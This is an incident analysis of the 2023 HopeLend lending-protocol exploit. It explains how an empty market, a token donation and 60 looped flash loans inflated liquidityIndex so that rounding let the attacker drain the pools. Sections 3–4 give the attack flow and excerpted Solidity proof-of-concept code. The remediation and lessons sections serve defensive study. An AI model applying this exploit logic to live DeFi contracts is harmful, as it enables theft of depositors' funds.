# Hope.money (HopeLend) — Precision Loss Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-10-18 |
| **Protocol** | Hope.money / HopeLend |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$825,000 (WETH, USDT, USDC, HOPE, stHOPE) |
| **Attacker** | [0xA8Bb...145b](https://etherscan.io/address/0xA8Bbb3742f299B183190a9B079f1C0db8924145b) |
| **Attack Contract** | [0xc74b...bb4](https://etherscan.io/address/0xc74b72bbf904bac9fac880303922fc76a69f0bb4) |
| **Attack Tx** | [0x1a7e...0392](https://etherscan.io/tx/0x1a7ee0a7efc70ed7429edef069a1dd001fbff378748d91f17ab1876dc6d10392) |
| **Vulnerable Contract** | [0x53Fb...030 (Pool)](https://etherscan.io/address/0x53FbcADa1201A465740F2d64eCdF6FAC425f9030) |
| **Root Cause** | Share/asset conversion precision loss via liquidityIndex manipulation (division floor error) |
| **PoC Source** | [DeFiHackLabs — Hopelend_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Hopelend_exp.sol) |

---

## 1. Vulnerability Overview

HopeLend is a lending protocol within the Hope.money ecosystem built on top of Aave V3. The protocol represents deposits as `hToken`s (e.g., hEthWBTC), and converts between actual asset amounts and scaled shares using `liquidityIndex` during deposits and withdrawals.

The attacker exploited three vulnerabilities in combination:

1. **Empty Market Condition**: The hEthWBTC market had a totalSupply of 0 before the attack, allowing the attacker to fully control the market state.
2. **Forcing totalSupply=1 via Large Donation**: The attacker directly transferred (donated) 2,000 WBTC to the hEthWBTC contract, then withdrew nearly all of it, driving totalSupply down to 1.
3. **Maximizing liquidityIndex via Repeated Flash Loans**: The attacker called HopeLend's own flash loan 60 times in a loop, accumulating fees (premiums) into the liquidityIndex. With the inflated index, division floor errors in share/asset conversion allowed burning 1 share while withdrawing assets equivalent to 1.5 shares.

---

## 2. Vulnerable Code Analysis

### 2.1 Share/Asset Conversion Based on liquidityIndex (Core Vulnerability)

HopeLend uses Aave V3's `WadRayMath` library, performing share ↔ asset conversions via `rayDiv` / `rayMul`.

**Vulnerable Code (inferred — based on Aave V3 Pool logic)**:
```solidity
// ❌ Share calculation during withdraw — precision loss occurs here
function withdraw(address asset, uint256 amount, address to)
    external returns (uint256)
{
    // amount(assets) / liquidityIndex = amountScaled(shares) — floor division
    // If liquidityIndex is very large, amountScaled is computed smaller than it should be
    uint256 amountScaled = amount.rayDiv(
        reserveCache.nextLiquidityIndex   // ❌ manipulated, extremely large index value
    );
    // Burns amountScaled shares and transfers amount assets
    // But due to rayDiv floor error, amountScaled < correct ratio → excess asset withdrawal
    IAToken(reserveData.aTokenAddress).burn(
        msg.sender, to, amount, reserveCache.nextLiquidityIndex
    );
}
```

**Problem**: `rayDiv(a, b)` computes `(a * 1e27 + b/2) / b`. When `b` (liquidityIndex) is extremely large, `a * 1e27 < b`, causing the result to floor to 0 or 1. That is, if the attacker requests `withdrawAmount = liquidityIndex * 3/2 - 1`, only 1 share is burned while assets worth 1.5 * liquidityIndex are withdrawn.

**Fixed Code**:
```solidity
// ✅ Calculate shares first before withdrawal, then back-calculate the actual withdrawable assets
function withdraw(address asset, uint256 amount, address to)
    external returns (uint256)
{
    uint256 userBalance = IAToken(reserveData.aTokenAddress)
        .scaledBalanceOf(msg.sender);

    uint256 amountToWithdraw = amount;
    if (amount == type(uint256).max) {
        amountToWithdraw = userBalance.rayMul(reserveCache.nextLiquidityIndex);
    }

    // ✅ Calculate shares first — final withdrawal amount determined from shares to burn
    uint256 sharesToBurn = amountToWithdraw.rayDiv(
        reserveCache.nextLiquidityIndex
    );
    // ✅ At least 1 share must be burned (prevents precision loss)
    require(sharesToBurn > 0, "HopeLend: amount too small for current index");
    // ✅ Recalculate actual withdrawal from shares (prevents excess withdrawal)
    uint256 actualWithdraw = sharesToBurn.rayMul(reserveCache.nextLiquidityIndex);

    IAToken(reserveData.aTokenAddress).burn(
        msg.sender, to, actualWithdraw, reserveCache.nextLiquidityIndex
    );
}
```

### 2.2 liquidityIndex Accumulation Mechanism

```solidity
// ❌ Flash loan fees accumulate into liquidityIndex
// Fee rate: 0.09%, minus 30% protocol cut → effective 0.063%
// After 60 iterations: index += premium * 60
uint256 premiumPerFlashloan = 2000e8 * 9 / 10_000;       // 0.09% fee
premiumPerFlashloan -= (premiumPerFlashloan * 30 / 100);  // 30% protocol cut
uint256 nextLiquidityIndex = premiumPerFlashloan * 60 + 1;  // accumulated over 60 iterations
```

When this index accumulates in a state where totalSupply=1, the value of 1 share becomes abnormally high, proportional to `nextLiquidityIndex`.

### 2.3 Attacker's Precision Loss Formula

```solidity
// Optimal withdrawal amounts calculated by the attacker
uint256 depositAmount  = nextLiquidityIndex;        // Minimum assets needed to mint 1 share
uint256 withdrawAmount = nextLiquidityIndex * 3 / 2 - 1; // Maximum assets withdrawable by burning 1 share

// Net profit per cycle
uint256 profitPerCycle = withdrawAmount - depositAmount;  // ≈ 0.5 * nextLiquidityIndex
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- hEthWBTC market totalSupply = 0 before the attack (confirmed empty market)
- Execute `approve` for major tokens: WBTC, HOPE, stHOPE, etc.
- Prepare a 2,300 WBTC flash loan from Aave V3

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────┐
│  Attacker (0xA8Bb...145b)                           │
│  1. Request Aave V3 flashLoan(2300 WBTC)            │
└───────────────────┬─────────────────────────────────┘
                    │ Receive 2300 WBTC
                    ▼
┌─────────────────────────────────────────────────────┐
│  executeOperation — Phase 1 (index=1, AaveV3 callback) │
│  2. HopeLend.deposit(2000 WBTC) → mint 2000 hWBTC  │
│  3. HopeLend.flashLoan(2000 WBTC) → enter callback  │
└───────────────────┬─────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────┐
│  executeOperation — Phase 2 (index=2, HopeLend callback) │
│  4. Directly transfer 2000 WBTC to hEthWBTC contract │
│     → totalAssets spikes, totalSupply unchanged     │
│  5. HopeLend.withdraw(2000 WBTC - 1)                │
│     → burns nearly all shares → totalSupply = 1    │
└───────────────────┬─────────────────────────────────┘
                    │ Only 1 share remains
                    ▼
┌─────────────────────────────────────────────────────┐
│  executeOperation — Phase 3 (index=1, repeat loop)  │
│  6. Call HopeLend.flashLoan 60 times                │
│     → each call adds flash loan fee → liquidityIndex accumulates │
│     → collateral value of 1 share equals thousands of WBTC │
│  7. Borrow entire protocol liquidity                │
│     - WETH: full hToken balance                     │
│     - USDT: full hToken balance                     │
│     - USDC: full hToken balance                     │
│     - HOPE + stHOPE: borrow all, swap to USDT       │
└───────────────────┬─────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────┐
│  WithdrawAllWBTC() — Repeated Precision Loss Withdrawal │
│  8. deposit(depositAmount) → mint 1 share           │
│  9. withdraw(withdrawAmount=1.5x) → burn 1 share    │
│     → 0.5x net profit (excess withdrawal via precision loss) │
│  10. Repeat count times → drain all WBTC from hEthWBTC │
└───────────────────┬─────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────────────────┐
│  Liquidation and Profit Taking                      │
│  11. Convert WBTC → WETH → ETH                     │
│  12. Pay 264 ETH to coinbase (MEV/block reward)     │
│  13. Retain remaining ETH                           │
└─────────────────────────────────────────────────────┘
```

### 3.3 Results

- **Attacker profit**: ~$825,000 (approximately 264 ETH equivalent minus swap costs)
- **Protocol loss**: All liquidity in WETH, USDT, USDC, HOPE, stHOPE fully drained
- **WBTC hToken pool**: Drained to 0 (confirmed on-chain after attack: balance = 0)

---

## 4. PoC Code (DeFiHackLabs)

Key attack logic excerpts with English comments:

```solidity
// Step 1: Request 2300 WBTC flash loan from Aave V3
function testAttack() public {
    approveAll(); // Unlimited approve for all tokens

    address[] memory assets = new address[](1);
    assets[0] = address(WBTC);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = 2300 * 1e8; // 2300 WBTC flash loan

    // Start Aave V3 flash loan → enters executeOperation callback
    AaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    // Afterward: convert WBTC → WETH → ETH, pay 264 ETH to coinbase
}

// Step 2: Flash loan callback handler (branches on 3 cases)
function executeOperation(...) external returns (bool) {
    index++;

    // [Callback 1] Aave V3 callback: deposit 2000 WBTC, then start HopeLend flash loan
    if (index == 1) {
        HopeLend.deposit(address(WBTC), 2000 * 1e8, address(this), 0);
        // → 60-loop and borrow are handled in the msg.sender != HopeLend branch
    }

    // [Callback 2] HopeLend flash loan callback: Donation + force totalSupply=1
    if (index == 2) {
        // Key: directly transfer 2000 WBTC to hEthWBTC contract (Donation)
        // → assets increase externally (shares do NOT increase)
        WBTC.transfer(address(hEthWBTC), 2000 * 1e8);

        // Withdraw 2000 WBTC - 1 → remaining share count = 1
        HopeLend.withdraw(address(WBTC), 2000 * 1e8 - 1, address(this));
        return true;
    }

    // [Callback 3] Aave V3 callback re-entry: manipulate liquidityIndex + borrow all
    if (msg.sender != address(HopeLend)) {
        // Repeat HopeLend flash loan 60 times → maximize liquidityIndex
        for (uint idx = 0; idx < 60; idx++) {
            HopeLend.flashLoan(address(this), assets, amounts, modes,
                               address(this), "", 0x0);
        }

        // Borrow all protocol assets uncollateralized (collateral = 1 manipulated hEthWBTC share)
        HopeLend.borrow(address(WETH), WETHBalance, 2, 0, address(this));
        HopeLend.borrow(address(USDT), USDTBalance, 2, 0, address(this));
        HopeLend.borrow(address(USDC), USDCBalance, 2, 0, address(this));
        HopeLend.borrow(address(HOPE), HOPEBalance, 2, 0, address(this));
        HopeLend.borrow(address(stHOPE), stHOPEBalance, 2, 0, address(this));

        // Convert stHOPE → HOPE → USDT → USDC → WBTC
        // ... (swap code omitted)

        // Drain hEthWBTC pool via repeated precision loss withdrawals
        WithdrawAllWBTC();
    }
    return true;
}

// Step 3: Repeated precision loss withdrawal — core vulnerability exploitation
function WithdrawAllWBTC() internal {
    // Calculate effective liquidityIndex after 60 flash loans
    uint256 premiumPerFlashloan = 2000 * 1e8 * 9 / 10_000;         // 0.09% fee
    premiumPerFlashloan -= (premiumPerFlashloan * 30 / 100);        // 30% protocol cut
    uint256 nextLiquidityIndex = premiumPerFlashloan * 60 + 1;      // index accumulated over 60 iterations

    uint256 depositAmount  = nextLiquidityIndex;            // Assets required to mint 1 share
    uint256 withdrawAmount = nextLiquidityIndex * 3 / 2 - 1; // Maximum assets withdrawable by burning 1 share
    // ↑ Key: withdrawAmount/depositAmount = 1.5 → 0.5 share worth of assets obtained for free

    // First cycle: mint 2 shares, burn 1 share (withdraw 1.5x)
    HopeLend.deposit(address(WBTC), depositAmount * 2, address(this), 0); // mint 2 shares
    HopeLend.withdraw(address(WBTC), withdrawAmount, address(this));       // burn 1 share, withdraw 1.5x

    // Repeat count times: each cycle yields (withdrawAmount - depositAmount) net profit
    uint256 count = (2000 * 1e8 + depositAmount * 3 - withdrawAmount) / profitPerDAW + 1;
    for (uint idx = 0; idx < count; idx++) {
        HopeLend.deposit(address(WBTC), depositAmount, address(this), 0);  // mint 1 share
        HopeLend.withdraw(address(WBTC), withdrawAmount, address(this));    // burn 1 share, withdraw 1.5x
    }

    // Final: withdraw all remaining WBTC from hEthWBTC pool
    HopeLend.deposit(address(WBTC), depositAmount, address(this), 0);
    withdrawAmount = WBTC.balanceOf(address(hEthWBTC)); // full pool balance
    HopeLend.withdraw(address(WBTC), withdrawAmount, address(this));
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Precision loss based on liquidityIndex (division floor) | CRITICAL | CWE-682 | `05_integer_issues.md`, `16_accounting_sync.md` |
| V-02 | liquidityIndex manipulation via repeated flash loans | CRITICAL | CWE-841 | `02_flash_loan.md`, `16_accounting_sync.md` |
| V-03 | Empty Market + Donation attack | HIGH | CWE-682 | `17_staking_reward.md` (first depositor) |

### V-01: Precision Loss Based on liquidityIndex

- **Description**: In `rayDiv(amount, liquidityIndex)`, division floor causes fewer shares to be burned than the correct amount. With an artificially maximized liquidityIndex, withdrawing `withdrawAmount = 1.5 * liquidityIndex - 1` burns only 1 share while delivering assets worth 1.5 shares.
- **Impact**: Repeated execution allows unauthorized withdrawal of all WBTC in the pool.
- **Attack Conditions**: liquidityIndex must be sufficiently high; totalSupply must be very low (ideally 1).

### V-02: liquidityIndex Manipulation via Repeated Flash Loans

- **Description**: Calling HopeLend's own flash loan 60 times in a loop accumulates fees (premiums) into the liquidityIndex each iteration. With totalSupply=1 and a maximized index, the collateral value of the remaining 1 share far exceeds the actual pool balance.
- **Impact**: Allows borrowing the entire protocol liquidity (WETH, USDT, USDC, HOPE, stHOPE) without real collateral.
- **Attack Conditions**: totalSupply = 1; attacker has permission to call flash loans repeatedly.

### V-03: Empty Market + Donation Attack (First Depositor Variant)

- **Description**: The hEthWBTC market was empty (totalSupply=0) before the attack, making the attacker the first depositor. After a large donation followed by near-total withdrawal, totalSupply can be forced to 1.
- **Impact**: Satisfies the prerequisite conditions for the V-01 and V-02 attacks.
- **Attack Conditions**: The target token pool must be newly launched or completely empty.

---

## 6. Remediation Recommendations

### Immediate Actions

**Virtual Shares (Minimum Liquidity Lock)**:
```solidity
// ✅ Permanently lock minimum shares to a burn address during Pool initialization
uint256 constant VIRTUAL_SHARES = 1e3; // or a larger value
uint256 constant VIRTUAL_ASSETS = 1;

function initializeReserve(address asset) internal {
    // Permanently allocate initial 1000 shares to address(0) → fundamentally blocks first depositor attack
    _mint(address(0), VIRTUAL_SHARES);
    // Also assign minimum 1 unit of real assets
    totalAssets += VIRTUAL_ASSETS;
}
```

**Back-Calculate from Shares on Withdrawal**:
```solidity
// ✅ Recalculate withdrawal asset amount from shares to prevent excess withdrawal
function withdraw(address asset, uint256 amount, address to)
    external returns (uint256)
{
    uint256 sharesToBurn = amount.rayDiv(reserveCache.nextLiquidityIndex);
    require(sharesToBurn > 0, "Amount too small for current index");
    // Back-calculate actual withdrawal from shares (excess withdrawal impossible)
    uint256 actualAmount = sharesToBurn.rayMul(reserveCache.nextLiquidityIndex);
    // Process with actualAmount (not amount)
    ...
}
```

**Flash Loan Call Count Limit**:
```solidity
// ✅ Limit flash loan re-entry count within a single transaction
uint256 private _flashLoanCallCount;
uint256 constant MAX_FLASHLOAN_DEPTH = 5;

modifier limitFlashLoanDepth() {
    require(_flashLoanCallCount < MAX_FLASHLOAN_DEPTH, "Flash loan depth exceeded");
    _flashLoanCallCount++;
    _;
    _flashLoanCallCount--;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Precision Loss | Apply EIP-4626 standard `previewWithdraw` / `previewRedeem` pattern; determine withdrawal amount via share-based back-calculation |
| V-02 Index Manipulation | Set an upper bound on liquidityIndex change within a single transaction; limit flash loan call depth |
| V-03 Empty Market | Allocate Virtual Shares at pool initialization; enforce minimum deposit amount (dust prevention) |
| Overall | Redesign the mechanism by which flash loan fees accumulate into the index; segregate fees into a separate reserve |

---

## 7. Lessons Learned

1. **Empty markets are an attack surface**: Newly launched pools or fully empty pools satisfy the prerequisite for first depositor attacks. Before protocol launch, permanently lock a minimum amount of liquidity (Virtual Shares), or disable certain operations when totalSupply is 0.

2. **Fee accumulation into the index is dangerous**: In a design where fees accumulate directly into the liquidityIndex, an extremely low totalSupply causes the asset value per share to grow exponentially. Fees should be isolated into a separate reserve, or the index change should be capped.

3. **Division order is directly tied to security**: The asymmetry between `assets ÷ index` (floor) and `shares × index` (ceiling) produces precision loss. On withdrawal, shares should be calculated first and the actual asset amount back-calculated, always rounding in favor of the protocol.

4. **Aave V3 forks must incorporate the original's security improvements**: Aave V3 has already recognized similar attack vectors and applied mitigations. Forks should not merely copy code, but must incorporate the latest security patches and audit findings.

5. **Compound attacks require step-by-step assumption validation**: This attack chained three vulnerabilities sequentially (empty market, index manipulation, precision loss). Single-vulnerability scanners cannot detect it; fuzz testing that simulates the entire attack flow end-to-end is required.

---

## 8. On-Chain Verification

### 8.1 Tx Metadata

| Field | Value |
|------|----|
| Block Number | 18,377,042 |
| from | 0xA8Bbb3742f299B183190a9B079f1C0db8924145b (attacker EOA, matches) |
| Attack Tx | 0x1a7ee0a7efc70ed7429edef069a1dd001fbff378748d91f17ab1876dc6d10392 |
| Gas Used | 16,729,266 (reflects complex multi-step attack) |
| Effective Gas Price | 11,850,178,011 wei |
| Transaction Index | 0 (first Tx in block — likely MEV bundle) |

### 8.2 PoC vs On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|---------|
| hEthWBTC totalSupply (pre-attack) | 0 | 0 | Match |
| WBTC balance in hEthWBTC (pre-attack) | 0 | 0 | Match |
| hEthWBTC totalSupply (post-attack) | remaining shares | 15,120,000,002 (≈ 1.5e10) | Residual shares confirmed |
| WBTC balance in hEthWBTC (post-attack) | 0 (fully withdrawn) | 0 | Match |
| Total Loss | ~$825,000 | ~$825,000 | Match |

### 8.3 Precondition Verification

- On-chain confirmed: hEthWBTC `totalSupply = 0` at block 18,377,041 (immediately before attack block 18,377,042) → empty market condition holds
- WBTC balance also confirmed at 0 → attacker could control the entire market as the first depositor
- Post-attack WBTC balance = 0: confirmed successful full drain of WBTC from the pool

> Reference Analysis: [Lunaray — Deep Dive into HopeLend Hack](https://lunaray.medium.com/deep-dive-into-hopelend-hack-5962e8b55d3f)